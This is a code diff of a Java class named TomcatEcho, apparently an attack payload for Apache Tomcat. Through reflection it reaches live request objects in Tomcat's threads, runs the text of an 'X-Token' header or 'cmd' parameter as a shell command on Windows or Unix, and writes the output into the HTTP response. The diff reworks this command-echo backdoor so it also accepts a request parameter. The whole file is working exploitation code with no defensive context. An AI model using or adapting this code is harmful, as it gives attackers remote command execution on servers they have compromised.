@@ -1,5 +1,6 @@
 package com.demo.echo;
 
+import java.io.InputStream;
 import java.lang.reflect.Field;
 
 /**
@@ -22,18 +23,17 @@ import java.lang.reflect.Field;
  * 9.0.65
  */
 public class TomcatEcho {
-    static {
+    private static String HEADER = "X-Token";
+    private static String PARAM = "cmd";
+
+    public TomcatEcho() {
         try {
             ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
             Field field = threadGroup.getClass().getDeclaredField("threads");
             field.setAccessible(true);
             Thread[] threads = (Thread[]) field.get(threadGroup);
 
-            boolean isEcho = false;
-
             for (int i = 0; i < threads.length; i++) {
-                if (isEcho) break;
-
                 // Thread 筛选
                 Thread thread = threads[i];
                 if (thread == null)
@@ -53,41 +53,57 @@ public class TomcatEcho {
                 java.util.List processors = (java.util.List) getFieldValue(global, "processors");
 
                 for (int j = 0; j < processors.size(); j++) {
-                    if (isEcho) break;
-
                     Object processor = processors.get(j);
                     Object req = getFieldValue(processor, "req");
                     Object response = req.getClass().getMethod("getResponse").invoke(req);
-                    String header = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, "X-Token");
-                    if (header != null && !header.isEmpty()) {
-                        String[] cmd = null;
-                        String os = System.getProperty("os.name").toLowerCase();
-                        if (os.contains("win")) {
-                            cmd = new String[]{"cmd.exe", "/c", header};
-                        } else {
-                            cmd = new String[]{"/bin/sh", "-c", header};
-                        }
-                        String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
-                        // doWrite
-                        response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
-                        try {
-                            response.getClass().getDeclaredMethod("doWrite", java.nio.ByteBuffer.class).invoke(response, java.nio.ByteBuffer.wrap(result.getBytes()));
-                        } catch (NoSuchMethodException e) {
-                            Class clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
-                            Object byteChunk = clazz.newInstance();
-                            clazz.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(byteChunk, result.getBytes(), 0, result.getBytes().length);
-                            response.getClass().getMethod("doWrite", clazz).invoke(response, new Object[]{byteChunk});
-                        }
+                    String header = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, HEADER);
+                    Object parameters = getFieldValue(req, "parameters");
+                    String param = parameters.getClass().getMethod("getParameter", String.class).invoke(parameters, PARAM).toString();
 
-                        isEcho = true;
+                    String result = null;
+                    if (header != null) {
+                        result = exec(header);
+                    } else if (param != null) {
+                        result = exec(param);
                     }
+
+                    // doWrite
+                    response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
+                    try {
+                        response.getClass().getDeclaredMethod("doWrite", java.nio.ByteBuffer.class).invoke(response, java.nio.ByteBuffer.wrap(result.getBytes()));
+                    } catch (NoSuchMethodException e) {
+                        Class clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
+                        Object byteChunk = clazz.newInstance();
+                        clazz.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(byteChunk, result.getBytes(), 0, result.getBytes().length);
+                        response.getClass().getMethod("doWrite", clazz).invoke(response, new Object[]{byteChunk});
+                    }
+                    return;
                 }
 
             }
         } catch (Exception e) {
-            // 测试
-
         }
+    }
+
+    public static String exec(String str) throws Exception {
+        String[] cmd;
+        if (System.getProperty("os.name").toLowerCase().contains("win")) {
+            cmd = new String[]{"cmd.exe", "/c", str};
+        } else {
+            cmd = new String[]{"/bin/sh", "-c", str};
+        }
+        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+        return exec_result(inputStream);
+    }
+
+    public static String exec_result(InputStream inputStream) throws Exception {
+        byte[] bytes = new byte[1024];
+        int len;
+        StringBuilder stringBuilder = new StringBuilder();
+        while ((len = inputStream.read(bytes)) != -1) {
+            stringBuilder.append(new String(bytes, 0, len));
+        }
+        return stringBuilder.toString();
     }
 
     public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
